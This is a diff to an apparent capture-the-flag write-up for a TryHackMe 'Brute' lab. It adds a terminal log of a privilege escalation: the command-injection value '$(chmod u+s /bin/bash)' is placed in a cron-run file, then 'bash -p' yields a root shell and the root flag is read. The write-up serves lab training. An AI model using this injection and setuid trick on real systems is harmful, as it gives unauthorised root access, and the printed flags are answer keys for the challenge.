@@ -332,6 +332,19 @@ THM{PoI$0n_tH@t_L0g}
 
 Easypesy found an .notes file in ftp folder and then study it add $(chmod u+s /bin/bash) to /home/adrian/punch_in 
 
+adrian@brute:~$ nano /home/adrian/punch_in
+adrian@brute:~$ nano /home/adrian/punch_in
+adrian@brute:~$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
+adrian@brute:~$ /bin/bash -p
+bash-5.0# whoami
+root
+bash-5.0# id
+uid=1000(adrian) gid=1000(adrian) euid=0(root) groups=1000(adrian)
+bash-5.0# cat /root/root.txt
+THM{C0mm@nD_Inj3cT1on_4_D@_BruT3}
+
+
 Done by cron job got root shell
 THM{C0mm@nD_Inj3cT1on_4_D@_BruT3}
 
